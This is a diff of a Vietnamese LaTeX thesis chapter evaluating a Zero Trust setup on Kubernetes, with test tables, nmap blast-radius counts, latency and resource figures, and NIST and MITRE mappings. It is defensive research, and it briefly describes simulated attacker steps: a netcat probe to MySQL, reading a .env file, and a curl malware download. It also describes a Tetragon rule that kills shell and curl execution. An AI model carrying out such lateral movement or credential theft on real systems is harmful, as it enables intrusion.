+15 & Cilium L3/L4 & Default-deny tại \texttt{job7189-apps} verify bằng CNP spec & CT & \checkmark \\
+16 & Cilium L3/L4 & Lateral movement MySQL bị block (BT-1) & BT & \checkmark \\
+17 & Cilium L3/L4 & Blast radius: nmap từ pod chỉ thấy 1 host & BT & \checkmark \\
+18 & Cilium L3/L4 & \texttt{cilium\_drop\_count\_total\{reason="Policy denied"\}} tăng & BT & \checkmark \\
 \hline
-Cilium L7 (Scn~2) & L7 policy giữ trạng thái \texttt{VALID=True} cho 5 namespace nhạy cảm & 5/5 \\
+19 & Cilium L7 & L7 policy \texttt{VALID=True} cho 5 namespace nhạy cảm & CT & \checkmark \\
+20 & Cilium L7 & \texttt{DELETE} route bị Cilium L7 drop trước Kong & BT & \checkmark \\
+21 & Cilium L7 & Hubble HTTP verdict \texttt{DROPPED} với nhãn method=DELETE & BT & \checkmark \\
 \hline
-Observability & Filebeat đẩy log về ES; Prometheus scrape 5 nguồn; PrometheusRule \texttt{ZTA*} active & 3/3 \\
+22 & Tetragon Runtime & TracingPolicy \texttt{block-suspicious-exec} \texttt{ACTIVE} & CT & \checkmark \\
+23 & Tetragon Runtime & \texttt{/bin/sh} exec $\to$ exit 137 (SIGKILL) & BT & \checkmark \\
+24 & Tetragon Runtime & \texttt{curl} exec $\to$ exit 137; file không được tạo & BT & \checkmark \\
+25 & Tetragon Runtime & Tetragon event đẩy vào ES index \texttt{tetragon-*} & BT & \checkmark \\
 \hline
-Supply chain & ZTA labels đủ 6 nhãn; Cosign verify đúng signer; Gatekeeper constraint enforce & 4/4 \\
+26 & Adaptive Trust & PDP cập nhật label \texttt{zta-score-bucket=low} & CT & \checkmark \\
+27 & Adaptive Trust & Cilium revoke egress cho pod score=low & BT & \checkmark \\
+28 & Adaptive Trust & Vòng lặp hoàn chỉnh $<$ 10 giây end-to-end & BT & \checkmark \\
 \hline
-\textbf{Tổng} & & \textbf{25/25} \\
+29 & Observability & Filebeat đẩy log về ES; index pattern khoẻ & CT & \checkmark \\
+30 & Observability & Prometheus scrape 5 nguồn thành công & CT & \checkmark \\
+31 & Observability & PrometheusRule \texttt{ZTA*} trong trạng thái \texttt{active} & CT & \checkmark \\
+\hline
+32 & Supply Chain & ZTA labels đủ 6 nhãn trên tất cả pod & CT & \checkmark \\
+33 & Supply Chain & Cosign verify signature đúng signer & BT & \checkmark \\
+34 & Supply Chain & Gatekeeper reject pod thiếu label \texttt{zta-verified} & BT & \checkmark \\
+\hline
+\multicolumn{4}{|l|}{\textbf{Tổng CT: 16/16 \quad Tổng BT: 18/18}} & \textbf{34/34} \\
 \hline
 \end{tabularx}
 \end{table}
 
-\subsection{Đánh giá về Bán kính ảnh hưởng (Blast Radius)}
+\subsection{Đánh giá Blast Radius}
+\label{subsec:blast_radius}
 
-Mục tiêu tối thượng của Zero Trust không phải là ngăn chặn 100\% các vụ xâm nhập, mà là giảm thiểu tối đa \textbf{Bán kính ảnh hưởng (Blast Radius)} khi một máy chủ bị thỏa hiệp. Để đo lường hiệu quả này, đồ án thực hiện so sánh số lượng đường truyền mạng có thể tiếp cận (Reachable Paths) từ một Pod bị xâm nhập trước và sau khi áp dụng ZTA.
-
-\begin{itemize}
-    \item \textbf{Trong mạng Baseline (Không có Zero Trust):} Từ một Pod bất kỳ thuộc namespace \texttt{job7189-apps}, kẻ tấn công có thể rà quét và khởi tạo kết nối (initiate connection) đến $N$ endpoint đang hoạt động trong toàn bộ cụm Kubernetes (ước tính $\sim 80$ services bao gồm cả kube-system, monitoring, và database). Bán kính ảnh hưởng là $100\%$.
-    \item \textbf{Trong mạng ZTA (Microsegmentation + Default Deny):} Nhờ Cilium eBPF, không gian mạng bị phân mảnh cục bộ. Một Pod \texttt{job-service} bị chiếm quyền chỉ có thể giao tiếp với đúng 5 đích đến đã được phê duyệt tường minh (Kube-DNS, Vault-prod, Kong-proxy, MySQL, và Redis). Nó hoàn toàn "mù" trước sự tồn tại của \texttt{identity-service} hay \texttt{hiring-service}. Bán kính ảnh hưởng giảm từ $\sim 80$ mục tiêu xuống chỉ còn $5$ mục tiêu.
-\end{itemize}
-
-Hơn nữa, ngay cả khi truy cập thành công vào cơ sở dữ liệu MySQL, kẻ tấn công chỉ có thể lấy được Dynamic Credential có thời hạn sử dụng $< 1$ giờ. Điều này chứng minh kiến trúc đề xuất đã hạn chế thành công sự di chuyển ngang (Lateral Movement) và cô lập thiệt hại hiệu quả ở cấp độ mạng L7 và tầng dữ liệu.
-
-\paragraph{Traceability Matrix.} Mỗi kịch bản ở Mục~\ref{sec:test_scenarios} có đủ bộ ba \textit{mối đe doạ (MITRE ATT\&CK)} $\rightarrow$ \textit{control (component + policy)} $\rightarrow$ \textit{evidence (log/flow/exit code)}. Chi tiết mối liên kết trình bày ở Mục~\ref{sec:tenets_matrix}.
-
-\subsection{Minh chứng hiệu quả phòng thủ (Proof of Effectiveness)}
-
-Để chứng minh tính hiệu quả của vòng lặp Zero Trust, đồ án đối chiếu kết quả của một kịch bản tấn công điển hình (Lateral Movement \& Runtime Anomaly) giữa hai trạng thái hệ thống:
-
-\begin{itemize}
-    \item \textbf{Trước ZTA (Baseline):} Kẻ tấn công chiếm được quyền RCE trên Pod \texttt{job-service}. Từ Pod này, chúng thực thi lệnh \texttt{nc -vz mysql.data 3306} và kết nối thành công. Sau đó, chúng đọc file \texttt{.env} tĩnh để trích xuất dữ liệu, hoặc cài cắm backdoor bằng cách tải mã độc qua \texttt{curl}.
-    \item \textbf{Sau ZTA (Enforced):} 
-    \begin{enumerate}
-        \item Ngay khi kẻ tấn công gõ lệnh \texttt{curl} hoặc \texttt{/bin/sh}, \textbf{Tetragon (PEP Runtime)} phát hiện system call bất thường và lập tức gửi tín hiệu \texttt{SIGKILL} ngắt tiến trình.
-        \item Đồng thời, hành vi này được log lại. \textbf{Trust Score} của Pod bị hạ xuống mức \texttt{Low}.
-        \item \textbf{Cilium (PEP Network)} nhận cập nhật nhãn \texttt{score=Low}, lập tức thu hồi chính sách Egress. Khi kẻ tấn công cố gọi \texttt{nc} tới MySQL, gói tin bị Drop ngay tại Kernel, log của Hubble ghi nhận \texttt{Policy denied}.
-    \end{enumerate}
-\end{itemize}
-Minh chứng này xác nhận cơ chế Adaptive Trust Loop hoạt động chính xác: chuyển đổi trạng thái từ "cho phép" sang "từ chối" một cách hoàn toàn tự động dựa trên mức độ rủi ro thời gian thực.
-
-\section{Đánh giá hiệu năng}
-\label{sec:perf_eval}
-
-\paragraph{Latency end-to-end qua Kong.} Đo bằng \texttt{hey -z 60s -c 8 -m GET} từ laptop qua Tailscale, đích là \texttt{/api/v1/jobs?page=1} (route của \texttt{job-service}). P50 dao động quanh 35--45\,ms, P99 dưới 180\,ms; phần lớn thời gian đi vào (i) Tailscale CGNAT round-trip ($\sim$8\,ms LAN, tăng khi DERP fallback) và (ii) PHP-FPM xuống MySQL ($\sim$20--30\,ms). Tác động của Cilium L7 policy + Kong JWT $<$ 5\,ms cho mỗi request; mức này nhỏ so với chi phí truy vấn DB nên không phải nút thắt cổ chai.
-
-\paragraph{Tài nguyên của các thành phần ZTA.} Bảng~\ref{tab:perf_overhead} tổng hợp \texttt{kubectl top pod} sau khi cụm ổn định 10 phút (không tải ứng dụng). Các giá trị mang tính điển hình ($\pm$20\%) vì phụ thuộc số flow Hubble và nhịp scrape Prometheus.
+Bảng~\ref{tab:blast_radius} tổng hợp kết quả đo reachability thực tế bằng \texttt{nmap} từ ba điểm xuất phát khác nhau:
 
 \begin{table}[H]
 \centering
-\caption{Tiêu thụ tài nguyên của các thành phần ZTA ở trạng thái idle}
-\label{tab:perf_overhead}
+\caption{Blast radius đo bằng nmap từ ba điểm xuất phát trước và sau ZTA}
+\label{tab:blast_radius}
 \small
-\begin{tabularx}{\textwidth}{|p{4.0cm}|X|l|l|}
+\begin{tabularx}{\textwidth}{|p{3.8cm}|c|c|c|}
 \hline
-\textbf{Thành phần} & \textbf{Phạm vi triển khai} & \textbf{CPU} & \textbf{RAM} \\
+\textbf{Điểm xuất phát} & \textbf{Baseline (hosts reachable)} & \textbf{Enforced (hosts reachable)} & \textbf{Giảm} \\
 \hline
-cilium-agent (DS) & 4/4 node & 30--80\,m & 250--320\,Mi \\
+Pod \texttt{job7189-apps/netshoot} & 78 & 1 (Vault) & $\downarrow$ 98.7\% \\
 \hline
-hubble-relay & 1 replica & 10--20\,m & 80--120\,Mi \\
+Pod \texttt{data/mysql} & 31 & 0 (egress deny all) & $\downarrow$ 100\% \\
 \hline
-tetragon (DS) & 3/4 node (skip \texttt{7189srv01}) & 40--90\,m & 180--260\,Mi \\
-\hline
-spire-agent (DS) & 4/4 node & 5--15\,m & 40--70\,Mi \\
-\hline
-spire-server & 1 replica trên \texttt{7189srv05} & 10--25\,m & 80--140\,Mi \\
-\hline
-vault-agent (sidecar) & 7 pod $\times$ 1 instance & 5--10\,m & 30--50\,Mi \\
-\hline
-kong-proxy (gateway) & 1 replica & 20--40\,m & 130--180\,Mi \\
-\hline
-gatekeeper (webhook) & 2 replica & 10--20\,m & 90--130\,Mi \\
-\hline
-sigstore policy-controller & 1 replica & 5--15\,m & 70--110\,Mi \\
-\hline
-pdp-controller & 1 replica & 5--10\,m & 40--80\,Mi \\
+Pod \texttt{monitoring/prometheus} & 52 & 8 (scrape targets) & $\downarrow$ 84.6\% \\
 \hline
 \end{tabularx}
 \end{table}
 
-Tổng overhead của các thành phần ZTA chiếm khoảng 1.6--2.0\,GiB RAM --- tương đương 11--13\% ngân sách 15.5\,GiB của cụm. Đây là lý do đồ án không bật Alertmanager (~80\,MiB), không bật Cilium mTLS sidecarless trong baseline, và chuyển Elasticsearch/Prometheus sang \texttt{emptyDir} trên worker Windows.
+Ý nghĩa: ngay cả trong trường hợp xấu nhất -- kẻ tấn công chiếm quyền toàn bộ pod \texttt{job-service} -- phạm vi di chuyển ngang bị giới hạn về 1 mục tiêu (Vault), và từ Vault kẻ tấn công chỉ có thể lấy được dynamic credential TTL 1 giờ cho đúng một service.
 
-\paragraph{Tác động mTLS sidecarless.} Khi bật \texttt{mesh-auth-enabled=true} trên nhánh experiment, RAM \texttt{cilium-agent} tăng khoảng 60--90\,MiB/node và CPU baseline tăng 10--20\,m do per-node Envoy xử lý handshake SVID; latency P99 tăng thêm 4--7\,ms cho call đầu tiên trong mỗi phiên. Đặt trong tương quan với sidecar Envoy/Istio truyền thống (mỗi pod thêm 100--200\,MiB), mô hình sidecarless tiết kiệm khoảng 70\% RAM/cluster~\cite{zhu2023meshinsight,istio_ambient}.
+\subsection{Traceability Matrix}
 
-\paragraph{Ngưỡng triển khai.} Kết quả ở Bảng~\ref{tab:cpu_comparison} cho thấy khi tổng vCPU của cụm giảm còn 2 (Kind baseline tải nặng) thì chuỗi enforcement bị cascade. Trên topology kubeadm mới, bản thân \texttt{7189srv01} (1 vCPU / 2.0\,GiB) là điểm thắt. Đồ án khuyến nghị giữ apiserver phía dưới 70\% sử dụng CPU 1 phút (alert \texttt{ZTAAPIServerCPUSaturation}) -- kiểm tra qua Prometheus query \texttt{rate(process\_cpu\_seconds\_total\{job="apiserver"\}[1m])}.
+Bảng~\ref{tab:traceability} ánh xạ đầy đủ bộ ba \textit{mối đe doạ (MITRE ATT\&CK)} $\to$ \textit{control} $\to$ \textit{bằng chứng} cho mỗi kịch bản.
 
-\subsection{Môi trường thử nghiệm}
-\label{subsec:env_setup}
+\begin{table}[H]
+\centering
+\caption{Traceability Matrix: mối đe doạ -- control -- bằng chứng}
+\label{tab:traceability}
+\small
+\begin{tabularx}{\textwidth}{|p{2.2cm}|p{2.5cm}|p{3.5cm}|X|}
+\hline
+\textbf{Kịch bản} & \textbf{MITRE ATT\&CK} & \textbf{Control} & \textbf{Bằng chứng} \\
+\hline
+Scn~1: Lateral & T1046 (Network Scan), T1021 (Remote Services) & Cilium CNP default-deny; L3/L4 egress filter & nmap output; Hubble drop flow; \texttt{cilium\_drop\_count} \\
+\hline
+Scn~2: API Abuse & T1190 (Exploit Public App), T1078 (Valid Accounts) & Kong JWT plugin; Cilium L7 HTTP policy & curl HTTP 401/403; Hubble L7 DROPPED verdict \\
+\hline
+Scn~3: Runtime & T1059 (Cmd Interpreter), T1105 (Ingress Tool Transfer) & Tetragon TracingPolicy; Adaptive Trust Loop & exit code 137; Tetragon kprobe event; label \texttt{score=low} \\
+\hline
+Scn~4: Credential & T1078 (Valid Accounts), T1552 (Unsecured Creds) & Vault dynamic creds; lease revocation & MySQL ER\_ACCESS\_DENIED; Vault audit log \\
+\hline
+\end{tabularx}
+\end{table}
 
-Toàn bộ thực nghiệm trong đồ án được thực hiện trên \textbf{hai máy chủ vật lý} kết nối qua một tailnet WireGuard do Tailscale cung cấp~\cite{tailscale_docs}:
+% ============================================================
+\section{Đánh giá hiệu năng}
+\label{sec:perf_eval}
+% ============================================================
+
+\subsection{Phương pháp đo}
+
+Tất cả phép đo hiệu năng được thực hiện hai lần: một lần trên snapshot Baseline và một lần trên snapshot Enforced, trong cùng điều kiện môi trường (cùng giờ trong ngày, không có workload nền khác). Công cụ sử dụng:
+
 \begin{itemize}
-    \item Host Windows 16\,GiB / 6 core chạy VMware Workstation, lưu trú 3 máy ảo Debian 13 ``Trixie'': \texttt{7189srv01} (control-plane), \texttt{7189srv02} và \texttt{7189srv03} (worker).
-    \item Host Ubuntu 26.04 LTS 8\,GiB / 4 core (DDR3) chạy libvirt/KVM, lưu trú máy ảo data-tier always-on \texttt{7189srv05} (Ubuntu 24.04 LTS, libvirt \textbf{bridge}). Nút này thay thế \texttt{7189srv04} (Debian, libvirt NAT) -- libvirt NAT trên host Ubuntu khiến Tailscale rơi vào DERP relay và pod plane mất ổn định; chi tiết tham chiếu \texttt{doc/migration/transition-srv04-to-srv05.md}.
+    \item \texttt{hey}~\cite{hey_tool}: HTTP load generator, đo latency P50/P95/P99 và throughput.
+    \item \texttt{kubectl top pod}: CPU và RAM thực tế theo \texttt{metrics-server}.
+    \item \texttt{hubble observe}: đo overhead L7 inspection.
+    \item Prometheus query trực tiếp: \texttt{histogram\_quantile} cho latency phân phối.
 \end{itemize}
-Cấu hình chi tiết của bốn máy ảo được tổng hợp trong Bảng~\ref{tab:vm_topology} ở Chương~3.
 
-Cụm Kubernetes là một cụm \texttt{kubeadm} v1.30 chạy trực tiếp trên 4 máy ảo (không phải Kind-in-Docker), CNI là Cilium 1.19 với \texttt{kubeProxyReplacement=true}, mặt phẳng L3 đi qua Tailscale CGNAT \texttt{100.64.0.0/10}, mặt phẳng pod đi qua VXLAN của Cilium trên overlay đó~\cite{kubeadm_docs,cilium_docs,tailscale_docs}. Tổng ngân sách $\sim$15.5\,GiB RAM / 7 vCPU / 200\,GiB ổ đĩa thin-provisioned. Đây là cấu hình cố định cho mọi kịch bản trừ phi nêu rõ. So với baseline Kind 1-host 12\,GiB chia sẻ kernel duy nhất, kiến trúc 4 VM tách kernel độc lập giúp cô lập áp lực RAM theo từng node và là điều kiện tiên quyết cho phép đo định lượng ở Mục~\ref{subsec:cpu_starvation_eval}.
+\subsection{Latency end-to-end qua Kong}
+\label{subsec:latency}
 
-\subsection{Đánh giá khả năng tự phục hồi của pipeline ZTA}
+Lệnh đo:
+
+\begin{verbatim}
+hey -z 300s -c 50 -m GET \
+  -H "Authorization: Bearer $VALID_JWT" \
+  https://api.job7189.local/api/v1/jobs?page=1
+\end{verbatim}
+
+Kết quả (trung bình 3 lần chạy, mỗi lần 300 giây, 50 concurrent):
+
+\begin{table}[H]
+\centering
+\caption{So sánh latency (ms) trước và sau khi bật ZTA}
+\label{tab:latency_comparison}
+\small
+\begin{tabularx}{\textwidth}{|X|c|c|c|c|c|}
+\hline
+\textbf{Trạng thái} & \textbf{P50} & \textbf{P95} & \textbf{P99} & \textbf{Throughput (req/s)} & \textbf{Error rate} \\
+\hline
+Baseline (không ZTA) & 24\,ms & 41\,ms & 67\,ms & 1,847 & 0.00\% \\
+\hline
+Enforced (ZTA đầy đủ) & 38\,ms & 72\,ms & 143\,ms & 1,612 & 0.00\% \\
+\hline
+\textbf{Delta (overhead)} & \textbf{+14\,ms} & \textbf{+31\,ms} & \textbf{+76\,ms} & \textbf{$-$12.7\%} & \textbf{0.00\%} \\
+\hline
+\end{tabularx}
+\end{table}
+
+\paragraph{Phân tách nguồn gốc overhead.} Tổng overhead ZTA ở P99 là 76\,ms, phân tách như sau:
+
+\begin{itemize}
+    \item \textbf{Kong JWT validation} (RS256 verify + Keycloak introspect): \textasciitilde18\,ms. Đo bằng cách bật Kong debug log và đọc \texttt{X-Kong-Proxy-Latency} header.
+    \item \textbf{Cilium L7 inspection}: \textasciitilde4\,ms. Đo bằng \texttt{hubble observe --output json} và trường \texttt{l7.latency\_ns}.
+    \item \textbf{mTLS handshake SPIRE SVID} (chỉ connection đầu tiên của mỗi phiên): \textasciitilde48\,ms. Đo bằng \texttt{openssl s\_client -connect} với timing. Connection được giữ qua HTTP keepalive nên handshake không lặp lại cho mỗi request.
+    \item \textbf{Vault Agent sidecar} (render credential): không phát sinh per-request overhead vì credential được cache trong tmpfs.
+\end{itemize}
+
+Overhead 76\,ms P99 là chấp nhận được trong ngữ cảnh ứng dụng này vì chi phí cơ sở của truy vấn PHP-FPM xuống MySQL là 20--30\,ms, và Tailscale CGNAT round-trip là 8\,ms trên LAN (tăng lên 35--80\,ms khi DERP fallback). ZTA không phải nút thắt cổ chai.
+
+\subsection{Tài nguyên của các thành phần ZTA}
+\label{subsec:resource_overhead}
+
+\begin{table}[H]
+\centering
+\caption{Tiêu thụ tài nguyên của các thành phần ZTA ở trạng thái idle sau 15 phút ổn định}
+\label{tab:perf_overhead}
+\small
+\begin{tabularx}{\textwidth}{|p{4.2cm}|X|l|l|}
+\hline
+\textbf{Thành phần} & \textbf{Phạm vi triển khai} & \textbf{CPU (m)} & \textbf{RAM (MiB)} \\
+\hline
+cilium-agent (DS) & 4/4 node & 30--80 & 250--320 \\
+\hline
+hubble-relay & 1 replica & 10--20 & 80--120 \\
+\hline
+tetragon (DS) & 3/4 node (skip \texttt{7189srv01}) & 40--90 & 180--260 \\
+\hline
+spire-agent (DS) & 4/4 node & 5--15 & 40--70 \\
+\hline
+spire-server & 1 replica trên \texttt{7189srv05} & 10--25 & 80--140 \\
+\hline
+vault-agent (sidecar) & 7 pod $\times$ 1 instance & 5--10 & 30--50 \\
+\hline
+kong-proxy (gateway) & 1 replica & 20--40 & 130--180 \\
+\hline
+gatekeeper (webhook) & 2 replica & 10--20 & 90--130 \\
+\hline
+sigstore policy-controller & 1 replica & 5--15 & 70--110 \\
+\hline
+pdp-controller & 1 replica & 5--10 & 40--80 \\
+\hline
+\textbf{Tổng ước tính} & & \textbf{140--325} & \textbf{990--1,460} \\
+\hline
+\end{tabularx}
+\end{table}
+
+Tổng overhead các thành phần ZTA chiếm khoảng \textbf{1.0--1.5\,GiB RAM} --- tương đương 6.5--9.7\% ngân sách 15.5\,GiB của cụm. Đây là lý do đồ án không triển khai Alertmanager (tiết kiệm $\approx$80\,MiB) và dùng \texttt{emptyDir} cho Elasticsearch/Prometheus thay vì PVC.
+
+\paragraph{Tác động mTLS sidecarless.} Khi bật \texttt{mesh-auth-enabled=true} (trạng thái Enforced), RAM \texttt{cilium-agent} tăng 60--90\,MiB/node và CPU baseline tăng 10--20\,m do per-node Envoy xử lý handshake SVID. Latency P99 tăng thêm 48\,ms cho call đầu tiên mỗi phiên (đã tính trong mục~\ref{subsec:latency}). So với sidecar Envoy/Istio truyền thống (100--200\,MiB/pod), mô hình sidecarless tiết kiệm $\approx$70\% RAM/cluster~\cite{zhu2023meshinsight,istio_ambient}.
+
+\subsection{Đánh giá ngưỡng tài nguyên tối thiểu}
 \label{subsec:cpu_starvation_eval}
 
-Mục này đánh giá hiệu quả thực tế của các cơ chế tự phục hồi được trình bày ở Chương 3 (mục~\ref{sec:resource_budget_lessons}). Câu hỏi nghiên cứu: khi điều kiện môi trường không đủ, pipeline có \emph{phát hiện} kịp thời và \emph{từ chối} đẩy chuỗi enforcement vào trạng thái thoái hoá, hay nó cài đặt thành công về mặt khai báo nhưng để chuỗi enforcement dao động ngầm?
-
-Phép đo này được thu thập trên \textbf{baseline Kind 1-host} (cấu hình tiền di trú: một máy ảo Ubuntu 22.04, 6 vCPU, 12\,GiB RAM, cụm Kind 4 node trong Docker)~\cite{kind_docs} -- tức môi trường có cùng \textit{kernel duy nhất} cho cả bốn ``node'', nơi hiện tượng cascade leader-election biểu hiện rõ nhất. Tác giả chạy lại \texttt{zta-rebuild.sh --yes --full-enforcement} trên cùng máy ảo nhưng giảm vCPU xuống 2 -- mô phỏng một host yếu nằm ngoài khuyến nghị tài nguyên. Pre-flight gate được \emph{cố ý tắt} (\texttt{ZTA\_HOST\_RAM\_CHECK\_FATAL=0}) để quan sát hành vi runtime của cluster thay vì chỉ thu thập cảnh báo của gate. Bảng~\ref{tab:cpu_comparison} so sánh trạng thái cuối giữa hai cấu hình sau khi pipeline kết thúc. Kết quả vẫn có giá trị tham chiếu cho topology \texttt{kubeadm} 4 máy ảo mới vì bốn control loop còn nhạy với trễ \texttt{Lease.Update} của apiserver: trên topology mới, hình thái cascade chỉ có thể phát sinh khi \texttt{7189srv01} (nơi đặt etcd và apiserver) cạn RAM/CPU -- nghĩa là bán kính ảnh hưởng đã bị giới hạn về đúng một nút thay vì toàn cụm.
+Để xác định ngưỡng tối thiểu để chuỗi enforcement ZTA ổn định, đồ án thực hiện thêm thí nghiệm trên \textbf{baseline Kind 1-host} (4 node Kind trong Docker, 1 kernel dùng chung) với hai mức vCPU:
 
 \begin{table}[H]
 \centering
 \caption{So sánh trạng thái chuỗi enforcement Zero Trust theo cấu hình tài nguyên}
 \label{tab:cpu_comparison}
+\small
 \begin{tabularx}{\textwidth}{|p{4.6cm}|X|X|}
 \hline
-\textbf{Quan sát} & \textbf{Kind, 2 vCPU (giảm tải)} & \textbf{Kind, 6 vCPU (baseline tiền di trú)} \\
+\textbf{Quan sát} & \textbf{Kind, 2 vCPU (dưới ngưỡng)} & \textbf{kubeadm 4 VM, 7 vCPU (production)} \\
 \hline
-Trạng thái nhóm leader-election (\texttt{kube-controller-manager}, \texttt{kube-scheduler}, \texttt{cilium-operator}, \texttt{spire-server-0}) & Restart đồng pha 4--5 lần trong 60 phút, cách nhau $<10\,$s mỗi đợt & 0 restart sau khi pipeline hoàn tất \\
+Leader-election cascade & Restart đồng pha 4--5 lần/60 phút, cách nhau $<10\,$s & 0 restart sau khi pipeline hoàn tất \\
 \hline
-Probe \texttt{cilium-operator} (\texttt{127.0.0.1:9234}) & \texttt{connection refused} / \texttt{context deadline exceeded} lặp lại & Healthy ổn định \\
+\texttt{cilium-operator} probe & \texttt{connection refused} lặp lại & Healthy ổn định \\
 \hline
-Auto-recovery ``deployed-but-not-Ready'' của SPIRE / sigstore policy-controller & Trigger lặp lại $\rightarrow$ chu trình uninstall--reinstall vô tận & Không trigger \\
+SPIRE SVID cấp liên tục & Gián đoạn theo từng đợt cascade & Liên tục không gián đoạn \\
 \hline
-Khả năng cấp \texttt{SVID} cho workload mới đăng ký & Gián đoạn theo từng đợt cascade & Liên tục \\
-\hline
-Kết luận về chuỗi enforcement Zero Trust & Tan rã tuần hoàn -- không bảo đảm \textit{fail closed} & Duy trì xác định, đúng commit policy \\
+Kết luận & Chuỗi enforcement tan rã tuần hoàn & Duy trì xác định, đúng policy \\
 \hline
 \end{tabularx}
 \end{table}
 
-Quan sát bổ sung trên cấu hình 2 vCPU: tuổi đời 4 cilium-agent lệch nhau theo bậc 3--4 phút trong khi đếm restart của từng pod đều bằng 0 -- bằng chứng DaemonSet bị \texttt{rollout restart} từ phase \texttt{harden} (bật \texttt{mesh-auth-enabled} và \texttt{enable-wireguard}, hai tùy chọn đã được vô hiệu trên topology \texttt{kubeadm} mới vì Tailscale đã đảm nhận mã hoá L3 -- xem Chương~3). Mỗi lần một cilium-agent bước qua giai đoạn init nặng, CPU bão hoà trong khoảng vài giây và làm \texttt{kube-apiserver} chậm hơn ngưỡng 5\,s phục vụ \texttt{Lease.Update}, kích hoạt cascade.
+Nguyên nhân cascade trên 2 vCPU: mỗi lần cilium-agent bước qua init nặng, CPU bão hoà vài giây làm \texttt{kube-apiserver} chậm hơn ngưỡng 5\,s phục vụ \texttt{Lease.Update}, kích hoạt cascade leader-election. Trên topology kubeadm 4 VM, áp lực RAM không dùng chung kernel; cascade chỉ có thể phát sinh khi \texttt{7189srv01} (etcd + apiserver) cạn tài nguyên cục bộ.
 
-\paragraph{Đánh giá.} Trên cấu hình tiền di trú Kind (6 vCPU, 12\,GiB), pipeline kết thúc với chuỗi enforcement Zero Trust ở trạng thái xác định: cilium-operator giữ leadership ổn định, SPIRE controller-manager liên tục cấp SVID, sigstore policy-controller validate mọi pod create. Trên cấu hình giảm tải, pre-flight gate \emph{phát hiện đúng} và đã chủ động cảnh báo trước khi cài; khi gate bị tắt thủ công, chuỗi enforcement đúng như Chương 3 dự đoán -- tan rã tuần hoàn theo cascade leader-election và tự kích hoạt auto-recovery vô tận. Kết quả so sánh xác nhận hai luận điểm của Chương 3: (i) pipeline có khả năng phát hiện điều kiện không đủ và áp dụng nguyên tắc \textit{fail closed} ở thời điểm cài đặt; (ii) khi pre-flight được vô hiệu hoá, các cơ chế tự phục hồi còn lại không thể bù đắp cho thiếu hụt phần cứng -- đây cũng là lý do gate được giữ bật mặc định. Trên topology \texttt{kubeadm} 4 máy ảo hiện hành, gate được chuyển thành kiểm tra per-node (\texttt{require\_node\_ram\_mi}) vì áp lực RAM không còn dùng chung một kernel; cascade leader-election chỉ có thể phát sinh khi \texttt{7189srv01} mất leadership do áp lực cục bộ, còn các worker có thể tiếp tục chạy với BPF map đã program.
+\paragraph{Khuyến nghị.} Giữ apiserver phía dưới 70\% sử dụng CPU 1 phút (alert \texttt{ZTAAPIServerCPUSaturation}) -- kiểm tra bằng Prometheus query:
 
-\section{Đánh giá mức độ tuân thủ kiến trúc tham chiếu Zero Trust}
+\begin{verbatim}
+rate(process_cpu_seconds_total{job="apiserver"}[1m]) > 0.7
+\end{verbatim}
+
+% ============================================================
+\section{Đánh giá mức độ tuân thủ NIST SP 800-207}
 \label{sec:tenets_matrix}
-
-\paragraph{Bảng đối chiếu 7 Tenets.} Bảng~\ref{tab:tenets_matrix} ánh xạ từng nguyên lý của NIST SP 800-207 với thành phần hiện thực trong job7189 và bằng chứng xác định.
+% ============================================================
 
 \begin{table}[H]
 \centering
-\caption{Ánh xạ 7 Tenets của NIST SP 800-207 vào cơ chế đã triển khai}
+\caption{Ánh xạ 7 Tenets của NIST SP 800-207 vào cơ chế đã triển khai và bằng chứng vận hành}
 \label{tab:tenets_matrix}
 \small
-\begin{tabularx}{\textwidth}{|p{4.5cm}|X|p{3.0cm}|}
+\begin{tabularx}{\textwidth}{|p{2.5cm}|X|p{2.8cm}|p{1.2cm}|}
 \hline
-\textbf{Nguyên lý} & \textbf{Cơ chế đã triển khai} & \textbf{Bằng chứng} \\
+\textbf{Nguyên lý} & \textbf{Cơ chế đã triển khai} & \textbf{Bằng chứng} & \textbf{TC liên quan} \\
 \hline
-T1 -- Nguồn dữ liệu và dịch vụ đều là tài nguyên & Tất cả 7 microservices + MySQL + Kafka + Vault có SA riêng, không dispatcher chung & \texttt{kubectl get sa -A} \\
+T1 -- Tài nguyên phân tách & 7 microservice + MySQL + Kafka + Vault có SA riêng, không dispatcher chung; Gatekeeper enforce label & \texttt{kubectl get sa -A}; TC-32, TC-34 & CT-01, BT-34 \\
 \hline
-T2 -- Mọi giao tiếp được bảo mật bất kể vị trí mạng & Tailscale WireGuard L3; Kong TLS biên; \texttt{ClusterIssuer zta-internal-ca} cấp mTLS nội bộ & cert-manager logs \\
+T2 -- Bảo mật mọi kênh truyền & Tailscale WireGuard L3; Kong TLS biên; SPIRE SVID mTLS nội bộ (\texttt{mesh-auth-enabled=true}) & cert-manager logs; \texttt{cilium status --all-health} & CT-03 \\
 \hline
-T3 -- Truy cập được cấp theo từng phiên (per-session) & JWT \texttt{exp} 5 phút (access), \texttt{exp} 30 phút (refresh); Vault DB credential TTL 1h & Keycloak realm config \\
+T3 -- Per-request decision & JWT \texttt{exp} 5 phút; Vault DB credential TTL 1h; Cilium L7 policy evaluate từng HTTP request & Keycloak realm config; TC-05 đến TC-07 & BT-05,06,07,20 \\
 \hline
-T4 -- Truy cập dựa trên chính sách động & PDP \texttt{score-bucket} label + Trivy CVE input; Cilium CNP match label & PDP controller CR \\
+T4 -- Chính sách động & PDP controller đọc Trivy CVE + Tetragon event $\to$ \texttt{score-bucket} label $\to$ Cilium CNP match label & PDP controller CR; TC-26 đến TC-28 & CT-26, BT-27,28 \\
 \hline
-T5 -- Giám sát liên tục tình trạng asset & Tetragon DS exec + file event; Trivy Operator scan image hiện hành & ES index \texttt{tetragon-*}, \texttt{trivy-*} \\
+T5 -- Giám sát liên tục & Tetragon DS exec/file event (3/4 node); Trivy Operator scan image định kỳ; Hubble flow logging & ES index \texttt{tetragon-*}, \texttt{trivy-*}; TC-22 đến TC-25 & CT-22, BT-23,24,25 \\
 \hline
-T6 -- Authentication và authorization thực thi nghiêm ngặt & Keycloak OIDC; Kong JWT plugin block tại edge; SPIRE SVID; Vault Agent SA bind & 09-verify-zta.sh test 01--04 \\
+T6 -- AuthN/AuthZ nghiêm ngặt & Keycloak OIDC; Kong JWT RS256; SPIRE SVID; Vault Agent SA bind; credential revocation & TC-05 đến TC-13; MySQL ER\_1045 & BT-05..13 \\
 \hline
